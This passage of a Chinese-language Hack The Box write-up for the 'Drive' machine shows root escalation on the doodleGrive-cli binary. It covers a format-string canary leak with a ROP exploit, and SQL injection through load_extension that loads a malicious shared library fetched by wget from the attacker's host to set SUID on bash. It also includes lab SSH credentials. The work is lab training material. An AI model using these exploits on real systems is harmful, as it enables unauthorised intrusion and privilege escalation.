<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;doodleGrive-cli&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">ssh_host = <span class="string">&#x27;drive.htb&#x27;</span></span><br><span class="line">ssh_user = <span class="string">&#x27;tom&#x27;</span></span><br><span class="line">ssh_pass = <span class="string">&#x27;johnmayer7&#x27;</span></span><br><span class="line">ssh_port = <span class="number">22</span></span><br><span class="line"></span><br><span class="line">sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)</span><br><span class="line">p = sh.run(<span class="string">&#x27;./doodleGrive-cli&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x0000000000453e37</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401912</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000040f74e</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000040181f</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">syscall = <span class="number">0x00000000004012d3</span></span><br><span class="line">binsh = <span class="number">0x497CD5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Canary ==&gt; %15$p</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter Username:\n&quot;</span>,<span class="string">b&quot;%15$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter password for &#x27;</span>)</span><br><span class="line"></span><br><span class="line">Canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x38</span>+p64(Canary)+<span class="string">b&quot;deadbeef&quot;</span>+p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="方法二-load-extension"><a href="#方法二-load-extension" class="headerlink" title="方法二(load_extension)"></a>方法二(load_extension)</h5><p>一开始我想尝试利用文件读取函数来得到<code>/root/root.txt</code>,遗憾的是我并没有搜索到sqllie3的文件读取函数的有关信息；</p>
<p>利用SQLite3中的<code>load_extension</code>函数。你可以在这里查看更多关于它的信息：<a target="_blank" rel="noopener" href="https://www.sqlite.org/c3ref/load_extension.html">SQLite3 load_extension</a>。</p>
<p>经过广泛的测试后，我们注意到应用程序过滤掉了字符“ ”。和“&#x2F;”，最大输入长度为40个字符。为了绕过第一个限制，我们可以使用<code>char()</code>函数将文本写成ASCII。对于第二个限制，我们需要将文件压缩到只有一个字符以节省空间</p>
<p>创建一个恶意文件<code>a.c</code>;记住，文件名应该只包含一个字符，初始化函数应该遵循以下格式：<code>sqlite3_&lt;filename&gt;_init()</code>(也就是filename要与load_extension函数中的文件名要一致才行)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sqlite3_a_init</span><span class="params">()</span> &#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/usr/bin/chmod +s /bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared a.c -o a.so -nostartfiles -fPIC</span><br></pre></td></tr></table></figure>

<p>开启python服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>

<p>在靶机下载恶意文件并实时攻击得到root</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">tom@drive:~$ wget 10.10.16.13:8000/a.so</span><br><span class="line">tom@drive:~$ <span class="built_in">mv</span> a.so a</span><br><span class="line">tom@drive:~$ ./doodleGrive-cli </span><br><span class="line">[!]Caution this tool still <span class="keyword">in</span> the development phase...please report any issue to the development team[!]</span><br><span class="line">Enter Username:</span><br><span class="line">moriarty</span><br><span class="line">Enter password <span class="keyword">for</span> moriarty:</span><br><span class="line">findMeIfY0uC@nMr.Holmz!</span><br><span class="line">Welcome...!</span><br><span class="line"></span><br><span class="line">doodleGrive cli beta-2.2: </span><br><span class="line">1. Show <span class="built_in">users</span> list and info</span><br><span class="line">2. Show <span class="built_in">groups</span> list</span><br><span class="line">3. Check server health and status</span><br><span class="line">4. Show server requests <span class="built_in">log</span> (last 1000 request)</span><br><span class="line">5. activate user account</span><br><span class="line">6. Exit</span><br><span class="line">Select option: 5 </span><br><span class="line">Enter username to activate account: <span class="string">&quot;+load_extension(char(46,47,97))--+</span></span><br><span class="line"><span class="string">Activating account for user &#x27;&quot;</span>+load_extension(char(46,47,97))--+<span class="string">&#x27;...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tom@drive:~$ ls -l /bin/bash</span></span><br><span class="line"><span class="string">-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash</span></span><br><span class="line"><span class="string">tom@drive:~$ bash -p</span></span><br><span class="line"><span class="string">bash-5.0# whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>



</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-15</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 2474 words, 8 min 14 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Drive(HTB)%0Ahttps://zIxyd.github.io/2023/12/15/Drive(HTB)/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2024/01/01/Analytics/" title="Analytics(HTB)">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/12/14/Clicker(HTB)/" title="Clicker(HTB)">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>